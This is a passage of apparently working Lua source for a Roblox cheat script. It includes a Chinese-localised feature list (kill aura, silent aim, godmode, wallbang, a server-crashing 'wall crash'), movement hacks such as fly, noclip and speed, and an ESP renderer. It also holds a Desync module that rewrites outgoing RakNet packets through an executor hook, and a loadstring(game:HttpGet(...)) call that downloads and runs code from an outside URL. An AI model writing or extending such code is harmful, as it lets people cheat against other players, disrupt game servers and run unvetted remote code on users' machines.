							["ohio-misc-unlock-skin"] = "解锁皮肤",
							["ohio-rage"] = "Ohio 愤怒",
							["ohio-ragebot"] = "愤怒机器人",
							["ohio-ragebot-keybind"] = "按键",
							["ohio-ragebot-nextbot"] = "Nextbot",
							["ohio-rpg-trident-all"] = "RPG/三叉戟全服",
							["ohio-rpg-trident-all-delay"] = "延迟",
							["ohio-rpg-trident-all-keybind"] = "按键",
							["ohio-shake-aura"] = "抖动光环",
							["ohio-shake-aura-keybind"] = "按键",
							["ohio-shake-aura-max-target"] = "最大目标",
							["ohio-spray-nearest"] = "喷射最近",
							["ohio-spray-nearest-keybind"] = "按键",
							["ohio-stomp-aura"] = "踩踏光环",
							["ohio-stomp-aura-keybind"] = "按键",
							["ohio-target"] = "目标",
							["ohio-target-kill-method"] = "击杀方式",
							["One Punch"] = "一拳超人",
							["Prevent Respawn"] = "阻止重生光环",
							["render-bullet-tracer"] = "子弹轨迹",
							["render-camera"] = "相机",
							["render-camera-fov"] = "视野",
							["render-camera-noclip"] = "穿墙",
							["render-camera-smooth"] = "平滑",
							["render-camera-smooth-value"] = "速度",
							["render-esp"] = "ESP",
							["render-hitlog"] = "命中记录",
							["render-world"] = "世界",
							["RenderState.BulletTracer.EnemyColor"] = "敌人颜色",
							["RenderState.BulletTracer.SelfColor"] = "自身颜色",
							["RenderState.BulletTracer.Time"] = "时间",
							["RenderState.BulletTracer.Tracer"] = "模式",
							["RenderState.World.Color"] = "颜色",
							["Scythe → Spectral Scythe"] = "镰刀 → 幽灵镰刀",
							["settings-hit-sound"] = "命中音效",
							["settings-menu"] = "菜单",
							["settings-resolve-cache"] = "解析缓存",
							["Settings.ManualLoad.Module"] = "手动加载",
							["SettingsState.HitSound.Sound"] = "音效",
							["Silent Block"] = "静默防御",
							["silent-block"] = "静默防御",
							["Size X"] = "大小X",
							["Size Y"] = "大小Y",
							["Size Z"] = "大小Z",
							["TP All"] = "传送全服",
							["UBG Misc"] = "UBG 杂项",
							["UBG Rage"] = "UBG 暴力",
							["UBG Settings"] = "UBG 设置",
							["ubg-misc"] = "UBG 杂项",
							["ubg-rage"] = "UBG 暴力",
							["ubg-settings"] = "UBG 设置",
							UBG_ability_aura = "技能光环",
							UBG_ability_aura_mode = "模式",
							UBG_anti_grab = "反抓取",
							UBG_carry_abuse = "携带滥用",
							UBG_combat_switch = "允许战斗换角色",
							UBG_damage_boost = "伤害加强",
							UBG_dash_patch = "冲刺修补",
							UBG_endless_ult = "延长大招",
							UBG_fake_lag = "虚假延迟",
							UBG_fake_lag_interval = "虚假延迟间隔",
							UBG_fast_attack = "快速攻击",
							UBG_godmode = "无敌",
							UBG_hide_server_output = "屏蔽输出（服务器）",
							UBG_hide_sound = "屏蔽音效",
							UBG_hide_vfx = "屏蔽特效",
							UBG_hitbox = "范围",
							UBG_instant_respawn = "秒复活",
							UBG_instant_ult = "大招秒变",
							UBG_kill_aura = "杀戮光环",
							UBG_legit = "合法化",
							UBG_multi_ult = "大招多用",
							UBG_no_dash_cd = "冲刺无冷却",
							UBG_no_hitstun = "无僵直",
							UBG_no_jumpfatigue = "无跳跃疲劳",
							UBG_no_slow = "无减速",
							UBG_one_punch = "一拳超人",
							UBG_prevent_respawn = "阻止重生光环",
							UBG_silent_block = "静默防御",
							UBG_size_x = "大小X",
							UBG_size_y = "大小Y",
							UBG_size_z = "大小Z",
							UBG_tp_all = "传送全服",
							UBG_visualize = "可视化",
							UBG_wall_abuse = "墙打滥用",
							UBG_wall_abuse_death = "死亡",
							UBG_wall_abuse_delay = "延迟",
							UBG_wall_crash = "墙打炸服",
							UBG_wall_crash_delay = "延迟",
							Visualize = "可视化",
							["X Speed"] = "水平速度",
							["Y Speed"] = "垂直速度",
							["w-auto-equip-item"] = "物品",
							["w-auto-equip-keybind"] = "按键",
							["w-finish-arrest-keybind"] = "按键",
							["w-hitbox-keybind"] = "按键",
							["w-hitbox-part"] = "部位",
							["w-hitbox-size"] = "大小",
							["w-ignore-crawling"] = "忽略爬行",
							["w-ignore-grabbed"] = "忽略抓取",
							["w-ignore-knocked"] = "忽略击倒",
							["w-ragebot-keybind"] = "按键",
							["w-refresh-items"] = "刷新物品",
							["w-save-aura-keybind"] = "按键",
							["w-wallbang"] = "穿墙射击",
							["Wall Abuse"] = "墙打滥用",
							["Wall Crash"] = "墙打炸服",
							wallbang = "穿墙射击",
							["wanted-aim-assist"] = "辅助瞄准",
							["wanted-aim-assist-animation"] = "动画",
							["wanted-aim-assist-fov"] = "视野",
							["wanted-aim-assist-fov-color"] = "颜色",
							["wanted-aim-assist-part"] = "部位",
							["wanted-aim-assist-prediction-x"] = "预判 X",
							["wanted-aim-assist-prediction-y"] = "预判 Y",
							["wanted-aim-assist-range"] = "范围",
							["wanted-aim-assist-use-fov"] = "使用范围",
							["wanted-aim-assist-x-speed"] = "水平速度",
							["wanted-aim-assist-y-speed"] = "垂直速度",
							["wanted-auto-equip"] = "自动装备",
							["wanted-auto-farm"] = "自动农场",
							["wanted-car-mod"] = "车辆改装",
							["wanted-car-mod-topspeed"] = "最高速度",
							["wanted-car-mod-reversespeed"] = "倒车极速",
							["wanted-car-mod-gasaccel"] = "油门加速",
							["wanted-car-mod-brakeforce"] = "刹车力度",
							["wanted-car-mod-handbrake"] = "手刹强度",
							["wanted-car-mod-gearboost"] = "换挡推力",
							["wanted-car-mod-finaldrive"] = "终传动比",
							["wanted-car-mod-maxrpm"] = "最大转速",
							["wanted-car-mod-shiftratio"] = "升挡转速比",
							["wanted-car-mod-shifttime"] = "换挡耗时",
							["wanted-car-mod-turboboost"] = "涡轮增压倍率",
							["wanted-car-mod-turbolag"] = "涡轮延迟",
							["wanted-car-mod-drag"] = "空气阻力",
							["wanted-car-mod-downforce"] = "下压力",
							["wanted-car-mod-steermax"] = "最大转向角",
							["wanted-car-mod-steermin"] = "最小转向角",
							["wanted-car-mod-steerspeed"] = "转向速度",
							["wanted-car-mod-steermodifier"] = "转向灵敏度",
							["wanted-car-mod-steerhandbrake"] = "手刹转向倍率",
							["wanted-car-mod-susstiffness"] = "悬挂刚度",
							["wanted-car-mod-susdamping"] = "悬挂阻尼",
							["wanted-car-mod-ridefront"] = "前车身高度",
							["wanted-car-mod-riderear"] = "后车身高度",
							["wanted-car-mod-antiroll"] = "防侧倾杆",
							["wanted-car-mod-camber"] = "外倾角",
							["wanted-car-mod-weightfriction"] = "摩擦权重",
							["wanted-car-mod-weightaxle"] = "轴重权重",
							["wanted-car-mod-weightchassis"] = "车架权重",
							["wanted-car-mod-weightengine"] = "引擎权重",
							["wanted-car-mod-maxhealthchassis"] = "车架耐久上限",
							["wanted-car-mod-maxhealthtire"] = "轮胎耐久上限",
							["wanted-car-mod-maxhealthwindow"] = "车窗耐久上限",
							["wanted-car-mod-armorchassis"] = "车架护甲",
							["wanted-car-mod-armortire"] = "轮胎护甲",
							["wanted-car-mod-armorwindow"] = "车窗护甲",
							["wanted-car-mod-leanangle"] = "压弯角",
							["wanted-car-mod-wheelieangle"] = "抬头角",
							["wanted-car-mod-frontangle"] = "前倾角",
							["wanted-car-mod-slopetorque"] = "坡道扭矩倍率",
							["wanted-farm"] = "Wanted 农场",
							["wanted-farm-aura"] = "农场光环",
							["wanted-finish-arrest-aura"] = "处决/逮捕光环",
							["wanted-gun-mod"] = "枪械修改",
							["wanted-gun-mod-bullet-lifetime"] = "子弹存活时间",
							["wanted-gun-mod-bullet-speed"] = "子弹速度",
							["wanted-gun-mod-recoil"] = "后坐力",
							["wanted-gun-mod-spread"] = "扩散",
							["wanted-hitbox"] = "命中框",
							["wanted-legit"] = "合法化",
							["wanted-misc"] = "Wanted 杂项",
							["wanted-no-bank-gas"] = "无银行毒气",
							["wanted-no-bank-trip-laser"] = "无银行绊线",
							["wanted-no-ragdoll"] = "无布娃娃",
							["wanted-no-vehicle-hits"] = "无载具撞击",
							["wanted-rage"] = "Wanted 愤怒",
							["wanted-ragebot"] = "愤怒机器人",
							["wanted-save-aura"] = "救援光环",
							["wanted-silent-aim"] = "静默自瞄",
							["wanted-silent-aim-accuracy"] = "精度",
							["wanted-silent-aim-fov"] = "最大视野",
							["wanted-silent-aim-hit-chance"] = "命中率",
							["wanted-silent-aim-hitbox-arms"] = "手臂",
							["wanted-silent-aim-hitbox-body"] = "身体",
							["wanted-silent-aim-hitbox-head"] = "头部",
							["wanted-silent-aim-hitbox-legs"] = "腿部",
							["wanted-silent-aim-ignore-downed"] = "忽略倒地",
							["wanted-silent-aim-point-scale"] = "点位缩放",
							["wanted-silent-aim-prediction-x"] = "预判 X",
							["wanted-silent-aim-prediction-y"] = "预判 Y",
							["wanted-silent-aim-priority"] = "命中优先级",
							["wanted-silent-aim-visualize-fov"] = "显示视野",
							ohio_farm_aura_jewelrycase = "珠宝柜",
							farm_task_jewelrycase = "珠宝柜",
						},
					})

					local function fn7(H, m, h)
						D[1]:Notify({ Title = H, Content = m, Duration = h or 3 })
					end

					local movement = window:CreateTab({ Id = "tab-movement", Name = "Movement" })

					MovementState = {
						Speed = { Module = nil, Value = 40, Connect = nil },
						HighJump = { Module = nil, Value = 80, Connect = nil },
						Fly = { Module = nil, Value = 50, Connect = nil },
						Noclip = { Module = nil, Connect = nil },
						Spin = { Module = nil, Value = 40, Mode = "Normal", Connect = nil },
						Desync = { Module = nil, Mode = "Static", Value = 30 },
					}

					local v8 = nil
					local n = 0
					local n2 = 1

					local function fn8()
						local character = LocalPlayer.Character
						if not character then
							return nil, nil
						end
						local humanoid = FindFirstChildOfClass(character, "Humanoid")
						local humanoidRootPart = FindFirstChild(character, "HumanoidRootPart")
						if not humanoid or not humanoidRootPart or humanoid.Health <= 0 then
							return nil, nil
						end
						return humanoid, humanoidRootPart
					end

					local function fn9()
						if MovementState.Speed.Connect then
							Disconnect(MovementState.Speed.Connect)
							MovementState.Speed.Connect = nil
						end
					end

					local function fn10()
						fn9()

						MovementState.Speed.Connect = Connect(RunService.PreSimulation, function()
							if not MovementState.Speed.Module:Get() or MovementState.Fly.Module:Get() then
								return
							end
							local v9, v10 = fn8()
							if not v9 or not v10 then
								return
							end
							local climbing = Enum.HumanoidStateType.Climbing
							if v9:GetState() == climbing then
								v10.AssemblyLinearVelocity = NewVector3(0, 1 * MovementState.Speed.Value, 0)
								return
							end

							v10.AssemblyLinearVelocity = v9.MoveDirection * MovementState.Speed.Value
								+ NewVector3(0, v10.AssemblyLinearVelocity.Y, 0)
						end)
					end

					local function fn11()
						if v8 then
							return v8
						end
						local playerModule = FindFirstChild(PlayerScripts, "PlayerModule")
						local controlModule = playerModule and FindFirstChild(playerModule, "ControlModule")
						if not controlModule then
							return nil
						end
						local ok4, result4 = pcall(require, controlModule)
						if ok4 then
							v8 = result4
							return v8
						end
						return nil
					end

					local function fn12()
						local camera = Camera()
						local v9 = fn11()
						if not camera or not v9 then
							return EmptyVector3
						end
						local moveVector = v9:GetMoveVector()
						if moveVector.Magnitude <= 0.2 then
							return EmptyVector3
						end
						local cFrame = camera.CFrame
						return cFrame.RightVector * moveVector.X - cFrame.LookVector * moveVector.Z
					end

					stopFly = function()
						if MovementState.Fly.Connect then
							Disconnect(MovementState.Fly.Connect)
							MovementState.Fly.Connect = nil
						end
					end

					startFly = function()
						stopFly()

						MovementState.Fly.Connect = Connect(RunService.PreSimulation, function()
							if not MovementState.Fly.Module:Get() then
								return
							end
							local v9, v10 = fn8()
							if not v9 or not v10 or not (v10 and v10.Parent) then
								return
							end
							local v11 = fn12()
							if v11.Magnitude < 0.01 then
								v10.AssemblyLinearVelocity = EmptyVector3
								return
							end
							v10.AssemblyLinearVelocity = v11.Unit * MovementState.Fly.Value + NewVector3(0, 1.5, 0)
						end)
					end

					local function fn13()
						if MovementState.Noclip.Connect then
							Disconnect(MovementState.Noclip.Connect)
							MovementState.Noclip.Connect = nil
						end
					end

					local function fn14()
						fn13()

						MovementState.Noclip.Connect = Connect(RunService.PreSimulation, function()
							if not MovementState.Noclip.Module:Get() then
								return
							end
							local character = LocalPlayer.Character
							if not character then
								return
							end
							local humanoid = FindFirstChildOfClass(character, "Humanoid")
							if not humanoid then
								return
							end
							local physics = Enum.HumanoidStateType.Physics

							if humanoid:GetState() == physics then
								for _, v9 in GetChildren(character) do
									if IsA(v9, "BasePart") then
										v9.CanCollide = true
									end
								end

								return
							end

							for _, v9 in GetChildren(character) do
								if IsA(v9, "BasePart") then
									v9.CanCollide = false
								end
							end
						end)
					end

					local function fn15()
						if MovementState.Spin.Connect then
							Disconnect(MovementState.Spin.Connect)
							MovementState.Spin.Connect = nil
						end

						local v9 = fn8()
						if not v9 then
							return
						end
						v9.AutoRotate = true
					end

					local function fn16()
						n = 0
						n2 = 1
					end

					local function fn17()
						local camera = Camera()
						if not camera then
							return nil
						end
						local n3 = camera.CFrame.LookVector * NewVector3(1, 0, 1)
						if n3.Magnitude < 0.01 then
							return nil
						end
						local unit = n3.Unit
						return Atan2(unit.X, unit.Z)
					end

					local function fn18()
						fn15()
						fn16()

						MovementState.Spin.Connect = Connect(RunService.PreSimulation, function(arg)
							if not MovementState.Spin.Module:Get() then
								return
							end
							local v9, v10 = fn8()
							if not v9 or not v10 then
								return
							end
							v9.AutoRotate = false
							local v11, v12, v13 = v10.CFrame:ToOrientation()

							if MovementState.Spin.Mode == "Sway" then
								local v14 = fn17()
								if not v14 then
									return
								end
								n += Rad(20 * MovementState.Spin.Value) * n2 * arg

								if Abs(n) >= 6.5973445725385655 then
									n = 0
									n2 = -n2
								end

								v10.CFrame = NewCFrame(v10.Position) * Angles(v11, v14 + n, v13)
							else
								local n3 = 20 * MovementState.Spin.Value
								local n4 = Rad(tick() * n3 % 360)
								v10.CFrame = NewCFrame(v10.Position) * Angles(v11, n4, v13)
							end
						end)
					end

					MovementState.Speed.Module = movement:CreateModule({
						Id = "movement-speed",
						Name = "Speed",
						Callback = function(arg)
							if arg then
								fn10()
							else
								fn9()
							end
						end,
					})

					MovementState.Speed.Module:CreateKeybind({
						Id = "movement_speed_keybind",
						Name = "Keybind",
						Callback = function()
							MovementState.Speed.Module:Set(not MovementState.Speed.Module:Get())
						end,
					})

					MovementState.Speed.Module:CreateSlider({
						Id = "movement_speed_value",
						Name = "Value",
						Min = 0,
						Max = 1000,
						Default = MovementState.Speed.Value,
						Step = 1,
						Callback = function(value)
							MovementState.Speed.Value = value
						end,
					})

					MovementState.HighJump.Module = movement:CreateModule({
						Id = "movement-high-jump",
						Name = "High Jump",
						Callback = function(arg)
							if MovementState.HighJump.Connect then
								Disconnect(MovementState.HighJump.Connect)
								MovementState.HighJump.Connect = nil
							end

							if arg then
								local flag = true

								MovementState.HighJump.Connect = Connect(UserInputService.JumpRequest, function()
									local v9, v10 = fn8()
									if not v9 or not v10 or v9.FloorMaterial == Enum.Material.Air or not flag then
										return
									end
									flag = false
									local assemblyLinearVelocity = v10.AssemblyLinearVelocity

									v10.AssemblyLinearVelocity = NewVector3(
										assemblyLinearVelocity.X,
										MovementState.HighJump.Value,
										assemblyLinearVelocity.Z
									)

									Connect(v9.StateChanged, function(arg2, arg3)
										if arg3 == Enum.HumanoidStateType.Landed then
											flag = true
										end
									end)
								end)
							end
						end,
					})

					MovementState.HighJump.Module:CreateKeybind({
						Id = "movement_highjump_keybind",
						Name = "Keybind",
						Callback = function()
							MovementState.HighJump.Module:Set(not MovementState.HighJump.Module:Get())
						end,
					})

					MovementState.HighJump.Module:CreateSlider({
						Id = "movement_highjump_value",
						Name = "Value",
						Min = 0,
						Max = 1000,
						Default = MovementState.HighJump.Value,
						Step = 1,
						Callback = function(value)
							MovementState.HighJump.Value = value
						end,
					})

					MovementState.Fly.Module = movement:CreateModule({
						Id = "movement-fly",
						Name = "Fly",
						Callback = function(arg)
							if arg then
								startFly()
							else
								stopFly()
							end
						end,
					})

					MovementState.Fly.Module:CreateKeybind({
						Id = "MovementState.FlyKeybind",
						Name = "Keybind",
						Callback = function()
							MovementState.Fly.Module:Set(not MovementState.Fly.Module:Get())
						end,
					})

					MovementState.Fly.Module:CreateSlider({
						Id = "movement_fly_value",
						Name = "Value",
						Min = 0,
						Max = 1000,
						Default = MovementState.Fly.Value,
						Step = 1,
						Callback = function(value)
							MovementState.Fly.Value = value
						end,
					})

					MovementState.Noclip.Module = movement:CreateModule({
						Id = "movement-noclip",
						Name = "Noclip",
						Callback = function(arg)
							if arg then
								fn14()
							else
								fn13()
							end
						end,
					})

					MovementState.Noclip.Module:CreateKeybind({
						Id = "MovementState.NoclipKeybind",
						Name = "Keybind",
						Callback = function()
							MovementState.Noclip.Module:Set(not MovementState.Noclip.Module:Get())
						end,
					})

					MovementState.Spin.Module = movement:CreateModule({
						Id = "movement-spin",
						Name = "Spin",
						Callback = function(arg)
							if arg then
								fn18()
							else
								fn15()
							end
						end,
					})

					MovementState.Spin.Module:CreateKeybind({
						Id = "movement_spin_keybind",
						Name = "Keybind",
						Callback = function()
							MovementState.Spin.Module:Set(not MovementState.Spin.Module:Get())
						end,
					})

					MovementState.Spin.Module:CreateSlider({
						Id = "movement_spin_value",
						Name = "Value",
						Min = 0,
						Max = 1000,
						Default = MovementState.Spin.Value,
						Step = 1,
						Callback = function(value)
							MovementState.Spin.Value = value
						end,
					})

					MovementState.Spin.Module:CreateSelector({
						Id = "movement_spin_mode",
						Name = "Mode",
						Options = { { Value = "Normal" }, { Value = "Sway" } },
						Default = "Normal",
						Callback = function(mode)
							MovementState.Spin.Mode = mode
						end,
					})

					local n3 = 0

					local function fn19(arg)
						if arg.PacketId == 27 then
							local asBuffer = arg.AsBuffer
							buffer.readu32(asBuffer, 1)

							if MovementState.Desync.Mode == "Static" then
								buffer.writeu32(asBuffer, 1, 4294967295)
							else
								n3 += 1

								if n3 % MovementState.Desync.Value == 0 then
									buffer.writeu32(asBuffer, 1, 0)
								else
									buffer.writeu32(asBuffer, 1, 4294967295)
								end
							end

							arg:SetData(asBuffer)
						end
					end

					MovementState.Desync.Module = movement:CreateModule({
						Id = "movement-desync",
						Name = "Desync",
						Callback = function(arg)
							if
								raknet
								and typeof(raknet) == "table"
								and raknet.add_send_hook
								and raknet.remove_send_hook
							then
								if arg then
									raknet.add_send_hook(fn19)
								else
									raknet.remove_send_hook(fn19)
								end
							else
								fn7("Desync Failed", "Executor does not support RakNet", 10)
							end
						end,
					})

					MovementState.Desync.Module:CreateKeybind({
						Id = "movement-desync-keybind",
						Name = "Keybind",
						Callback = function()
							MovementState.Desync.Module:Set(not MovementState.Desync.Module:Get())
						end,
					})

					MovementState.Desync.Module:CreateSelector({
						Id = "movement-desync-mode",
						Name = "Mode",
						Options = { { Value = "Static" }, { Value = "Dynamic" } },
						Default = MovementState.Desync.Mode,
						Callback = function(mode)
							MovementState.Desync.Mode = mode
						end,
					})

					MovementState.Desync.Module:CreateSlider({
						Id = "movement_desync_value",
						Name = "Dynamic Packet",
						Min = 1,
						Max = 64,
						Default = MovementState.Desync.Value,
						Step = 1,
						Callback = function(value)
							MovementState.Desync.Value = value
						end,
					})

					local render = window:CreateTab({ Id = "tab-render", Name = "Render" })
					local v9 = _G

					if typeof(getgenv) == "function" then
						local ok4, result4 = pcall(getgenv)

						if ok4 and typeof(result4) == "table" then
							v9 = result4
						end
					end

					local lib2 = loadstring(
						game:HttpGet(
							typeof(v9.MoonEspLibraryUrl) == "string"
									and v9.MoonEspLibraryUrl ~= ""
									and v9.MoonEspLibraryUrl
								or "https://cnb.cool/MoonLua/ESP/-/git/raw/main/1"
						)
					)()

					local config = lib2.Config
					config.Enabled = false
					config.MaxDistance = 5000
					config.Name = true
					config.Health = false
					config.Distance = false
					config.Tool = false
					config.HealthBar = false
					config.Flags = false
					config.Boxes = false
					config.Chams = true
					config.OnlyEnemy = true
					config.WhitelistColor = NewRGB(72, 221, 146)
					config.BlacklistColor = NewRGB(255, 94, 124)
					config.TextColor = NewRGB(255, 255, 255)
					config.TextOutboxColor = NewRGB(0, 0, 0)
					config.BoxColor = NewRGB(0, 255, 0)
					config.HealthBackColor = NewRGB(0, 0, 0)
					config.HealthHighColor = NewRGB(0, 255, 0)
					config.HealthLowColor = NewRGB(255, 0, 0)
					config.ForceFieldFlagColor = NewRGB(110, 190, 255)
					config.ChamsOutline = true
					config.ChamsInline = true
					config.ChamsOutlineColor = NewRGB(255, 255, 255)
					config.ChamsOutlineAlpha = 0.3
					config.ChamsInlineColor = NewRGB(128, 128, 255)
					config.ChamsInlineAlpha = 0.8
					config.ChamsOutlineSize = 0.15
					config.ChamsInlineSize = 0.1
					config.HealthBarWidth = 4
					config.TextSize = 13
					config.MinTextSize = 9
					config.TextShrinkStartDistance = 300
					config.TextShrinkEndDistance = 1200
					config.TextYOffset = 5

					lib2:Override({
						GetPriority = function(arg)
							if typeof(PlayerList) == "table" and typeof(PlayerList.GetState) == "function" then
								local ok4, result4 = pcall(PlayerList.GetState, PlayerList, arg)

								if ok4 then
									if result4 == "Whitelist" then
										return "Friendly"
									end

									if result4 == "Blacklist" then
										return "Enemy"
									end
								end
							end

							return "Neutral"
						end,
						GetGuiParent = function()
							local playerGui = FindFirstChildOfClass(LocalPlayer, "PlayerGui")
							if playerGui then
								return playerGui
							end
							return LocalPlayer:WaitForChild("PlayerGui")
						end,
					})

					if v9.RobloxESP and v9.RobloxESP.Destroy then
						v9.RobloxESP:Destroy()
					end

					v9.RobloxESP = lib2

					local tbl3 = {
						ESP = nil,
						Camera = {
							Module = nil,
							Fov = 120,
							Noclip = true,
							OriginalFov = nil,
							OriginalOcclusionMode = nil,
							FovConnection = nil,
							OcclusionConnection = nil,
							SmoothPosition = EmptyVector3,
							Smooth = { Enabled = false, Speed = 15 },
						},
						World = {
							Module = nil,
							Color = NewRGB(190, 220, 255),
							Brightness = 0.15,
							Contrast = 0.135,
							Saturation = -0.225,
							Instance = nil,
						},
						BulletTracer = {
							Module = nil,
							SelfColor = NewRGB(37, 173, 255),
							EnemyColor = NewRGB(255, 94, 124),
							Time = 4,
							Tracer = "Obelus",
							Tracers = {},
							Tracerlist = {
								Obelus = {
									Texture = "rbxassetid://2382169232",
									Brightness = 1.5,
									Transparency = NumberSequence.new(0.7),
									LightEmission = 1,
									LightInfluence = 0,
									Segments = 1,
									TextureLength = 5,
									TextureMode = Enum.TextureMode.Stretch,
									TextureSpeed = 0,
									Width0 = 0.2,
									Width1 = 0.2,
									FaceCamera = true,
								},
								Lightning = {
									Texture = "rbxassetid://7151778302",
									Brightness = 1.5,
									Transparency = NumberSequence.new(0.7),
									LightEmission = 1,
									LightInfluence = 0,
									Segments = 10,
									TextureLength = 1,
									TextureMode = Enum.TextureMode.Stretch,
									TextureSpeed = 1,
									Width0 = 1.2,
									Width1 = 1.2,
									FaceCamera = true,
								},
								DNA = {
									Texture = "rbxassetid://7071778278",
									Brightness = 1.5,
									Transparency = NumberSequence.new(0.7),
									LightEmission = 1,
									LightInfluence = 0,
									Segments = 1,
									TextureLength = 12,
									TextureMode = Enum.TextureMode.Wrap,
									TextureSpeed = 1,
									Width0 = 0.6,
									Width1 = 0.6,
									FaceCamera = true,
								},
							},
						},
					}

					local function fn20()
						if tbl3.Camera.FovConnection then
							Disconnect(tbl3.Camera.FovConnection)
							tbl3.Camera.FovConnection = nil
						end
					end

					local function fn21(arg)
						if not tbl3.Camera.Module:Get() or not arg then
							return
						end
						fn20()
						arg.FieldOfView = tbl3.Camera.Fov

						tbl3.Camera.FovConnection = Connect(GetPropertyChangedSignal(arg, "FieldOfView"), function()
							if tbl3.Camera.Module:Get() and arg.FieldOfView ~= tbl3.Camera.Fov then
								arg.FieldOfView = tbl3.Camera.Fov
							end
						end)
					end

					local function fn22(arg)
						local camera = Camera()

						if arg then
							if camera and tbl3.Camera.OriginalFov == nil then
								tbl3.Camera.OriginalFov = camera.FieldOfView
							end

							fn21(camera)
						else
							fn20()

							if camera and tbl3.Camera.OriginalFov ~= nil then
								camera.FieldOfView = tbl3.Camera.OriginalFov
							end

							tbl3.Camera.OriginalFov = nil
						end
					end

					local function fn23()
						if tbl3.Camera.OcclusionConnection then
							Disconnect(tbl3.Camera.OcclusionConnection)
							tbl3.Camera.OcclusionConnection = nil
						end
					end

					local function fn24()
						fn23()
						LocalPlayer.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Invisicam

						tbl3.Camera.OcclusionConnection = Connect(
							GetPropertyChangedSignal(LocalPlayer, "DevCameraOcclusionMode"),
							function()
								if
									tbl3.Camera.Module:Get()
									and tbl3.Camera.Noclip
									and LocalPlayer.DevCameraOcclusionMode ~= Enum.DevCameraOcclusionMode.Invisicam
								then
									LocalPlayer.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Invisicam
								end
							end
						)
					end

					local function fn25(arg)
						if arg then
							if tbl3.Camera.OriginalOcclusionMode == nil then
								tbl3.Camera.OriginalOcclusionMode = LocalPlayer.DevCameraOcclusionMode
							end

							fn24()
						else
							fn23()

							LocalPlayer.DevCameraOcclusionMode = tbl3.Camera.OriginalOcclusionMode
								or Enum.DevCameraOcclusionMode.Zoom

							tbl3.Camera.OriginalOcclusionMode = nil
						end
					end

					Connect(GetPropertyChangedSignal(workspace, "CurrentCamera"), function()
						tbl3.Camera.SmoothPosition = nil
						fn22(tbl3.Camera.Module:Get())
						fn25(tbl3.Camera.Module:Get() and tbl3.Camera.Noclip)
					end)

					local function fn26(arg)
						local camera = Camera()
						if not tbl3.Camera.Module:Get() or not tbl3.Camera.Smooth.Enabled or not camera then
							tbl3.Camera.SmoothPosition = nil
							return
						end
						local cFrame = camera.CFrame
						local position = cFrame.Position

						if not tbl3.Camera.SmoothPosition then
							tbl3.Camera.SmoothPosition = position
						else
							local n4 = Clamp(arg * tbl3.Camera.Smooth.Speed, 0, 1)
							tbl3.Camera.SmoothPosition = tbl3.Camera.SmoothPosition:Lerp(position, n4)
						end

						camera.CFrame =
							NewCFrame(tbl3.Camera.SmoothPosition, tbl3.Camera.SmoothPosition + cFrame.LookVector)
					end

					tbl3.ESP = render:CreateModule({
						Id = "render-esp",
						Name = "ESP",
						Callback = function(arg)
							if arg then
								lib2:Start()
								lib2:SetEnabled(true)
							else
								lib2:Destroy()
							end
						end,
					})

					tbl3.ESP:CreateToggle({
						Id = "ESP.Config.Name",
						Name = "Name",
						Default = lib2.Config.Name,
						Callback = function(name)
							lib2.Config.Name = name
						end,
					})

					tbl3.ESP:CreateToggle({
						Id = "ESP.Config.Health",
						Name = "Health",
						Default = lib2.Config.Health,
						Callback = function(health)
							lib2.Config.Health = health
						end,
					})

					tbl3.ESP:CreateToggle({
						Id = "ESP.Config.Distance",
						Name = "Distance",
						Default = lib2.Config.Distance,
						Callback = function(distance)
							lib2.Config.Distance = distance
						end,
					})

					tbl3.ESP:CreateToggle({
						Id = "ESP.Config.Tool",
						Name = "Tool",
						Default = lib2.Config.Tool,
						Callback = function(tool)
							lib2.Config.Tool = tool
						end,
					})

					tbl3.ESP:CreateToggle({
						Id = "ESP.Config.HealthBar",
						Name = "HealthBar",
						Default = lib2.Config.HealthBar,
						Callback = function(healthBar)
							lib2.Config.HealthBar = healthBar
						end,
					})

					tbl3.ESP:CreateToggle({
						Id = "ESP.Config.OnlyEnemy",
						Name = "Only Enemy",
						Default = lib2.Config.OnlyEnemy,
						Callback = function(onlyEnemy)
							lib2.Config.OnlyEnemy = onlyEnemy
						end,
					})

					tbl3.ESP:CreateToggle({
						Id = "ESP.Config.Flags",
						Name = "Flags",
						Default = lib2.Config.Flags,
						Callback = function(flags)
							lib2.Config.Flags = flags
						end,
					})

					tbl3.ESP:CreateColorPicker({
						Id = "ESP.Config.BoxColor",
						Name = "Box Color",
						Default = lib2.Config.BoxColor,
						Nested = true,
						Parent = tbl3.ESP:CreateToggle({
							Id = "ESP.Config.Boxes",
							Name = "Boxes",
							Default = lib2.Config.Boxes,
							Callback = function(boxes)
								lib2.Config.Boxes = boxes
							end,
						}),
						Callback = function(boxColor)
							lib2.Config.BoxColor = boxColor
						end,
					})

					tbl3.ESP:CreateColorPicker({
						Id = "ESP.Config.WhitelistColor",
						Name = "Whitelist Color",
						Default = lib2.Config.WhitelistColor,
						Callback = function(whitelistColor)
							lib2.Config.WhitelistColor = whitelistColor
						end,
					})

					tbl3.ESP:CreateColorPicker({
						Id = "ESP.Config.BlacklistColor",
						Name = "Blacklist Color",
						Default = lib2.Config.BlacklistColor,
						Callback = function(blacklistColor)
							lib2.Config.BlacklistColor = blacklistColor
						end,
					})

					tbl3.ESP:CreateColorPicker({
						Id = "ESP.Config.HealthHighColor",
						Name = "Health High Color",
						Default = lib2.Config.HealthHighColor,
						Callback = function(healthHighColor)
							lib2.Config.HealthHighColor = healthHighColor
						end,
					})

					tbl3.ESP:CreateColorPicker({
						Id = "ESP.Config.HealthLowColor",
						Name = "Health Low Color",
						Default = lib2.Config.HealthLowColor,
						Callback = function(healthLowColor)
							lib2.Config.HealthLowColor = healthLowColor
						end,
					})

					tbl3.ESP:CreateToggle({
						Id = "ESP.Config.Chams",
						Name = "Chams",
						Default = lib2.Config.Chams,
						Callback = function(chams)
							lib2.Config.Chams = chams
						end,
					})

					local outline = tbl3.ESP:CreateToggle({
						Id = "ESP.Config.ChamsOutline",
						Name = "Outline",
						Default = lib2.Config.ChamsOutline,
						Callback = function(chamsOutline)
							lib2.Config.ChamsOutline = chamsOutline
						end,
					})

					tbl3.ESP:CreateColorPicker({
						Id = "ESP.Config.ChamsOutlineColor",
						Name = "Outline Color",
						Default = lib2.Config.ChamsOutlineColor,
						Nested = true,
						Parent = outline,
						Callback = function(chamsOutlineColor)
							lib2.Config.ChamsOutlineColor = chamsOutlineColor
						end,
					})

					tbl3.ESP:CreateSlider({
						Id = "ESP.Config.ChamsOutlineAlpha",
						Name = "Outline Alpha",
						Min = 0,
						Max = 1,
